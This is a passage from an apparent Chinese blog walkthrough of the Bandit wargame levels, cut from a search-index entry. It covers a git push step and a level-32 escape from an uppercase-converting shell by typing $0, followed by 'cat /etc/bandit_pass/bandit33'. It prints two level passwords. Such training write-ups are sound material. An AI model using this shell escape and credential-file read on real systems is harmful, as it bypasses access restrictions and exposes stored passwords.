将所有文件添加到暂存区，\u0026#34;.\u0026#34; 代表所有文件 git commit -m \u0026#34;task\u0026#34; -- 将暂存区的文件更新到本地仓库，-m指定提交消息，如果未指定此消息，则将打开默认文本编辑器 git push origin master -- 将本地的 master 分支推送到远程仓库（通常是 origin）的 master分支。 readme: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y level 32 题目描述 经历了所有这些git事情之后，是时候进行另一次逃脱了。祝你好运\n解决方法 登录进去后\n可以发现，在这个shell中输入的命令都会转为大写，这也就导致了命令出错\n所以该shell的内容基本是\nsh -c \u0026#34;\u0026lt;user-input\u0026gt;\u0026#34; 这里要将一个特殊的变量$0，它表示当前脚本的名称或路径\n创建一个script.sh文件\nscript.sh #!/bin/bash echo \u0026#34;$0\u0026#34; 接着我们运行它\n它所储存的就是当前正在执行的文件\n而如果我们直接打印 $0, 则表明当前使用的是zsh shell\n但如果我们只输入一个 $0 就会生成一个新的shell，相当与我们直接运行zsh shell\n所以我们就可以在upper shell中只输入一个 $0 来执行一个新的shell\n$0 cat /etc/bandit_pass/bandit33 readme: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy ","date":"0001-01-01T00:00:00Z","permalink":"https://blog.winglet.com/p/bandit0-33%E5%85%B3/","title":"Bandit0-33关"}]